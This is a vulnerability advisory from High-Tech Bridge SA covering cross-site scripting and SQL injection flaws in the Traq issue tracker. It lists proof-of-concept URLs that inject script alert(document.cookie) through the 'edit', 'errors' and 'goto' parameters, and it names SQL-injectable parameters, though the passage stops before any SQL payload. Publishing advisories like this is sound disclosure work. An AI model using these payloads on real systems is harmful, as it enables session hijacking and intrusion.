Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Traq, which can be exploited to perform cross-site scripting and sql injection attacks.

1) Input passed via the "edit" GET parameter is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a administrator browser session in context of affected website.

The following PoC code is available:

http://[host]/admincp/components.php?edit=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admincp/ticket_templates.php?edit=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admincp/custom_fields.php?edit=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admincp/groups.php?edit=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

2) Input passed via the "errors" GET parameter is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a administrator browser session in context of affected website.

The following PoC code is available:

http://[host]/admincp/components.php?edit&error&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admincp/groups.php?edit&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admincp/milestones.php?edit&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admincp/plugins.php?create&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admincp/projects.php?edit&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admincp/repositories.php?edit&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admincp/users.php?edit&errors[]=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of the vulnerabilities requires that "register_globals" is enabled.

3) Input passed via the "goto" GET parameter is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in a user'r browser session in context of affected website.

The following PoC code is available:

http://[host]/user/login?goto=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

4) Input passed via the "sort","order","component","milestone","priority","severity","status","type","version" GET parameters is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:
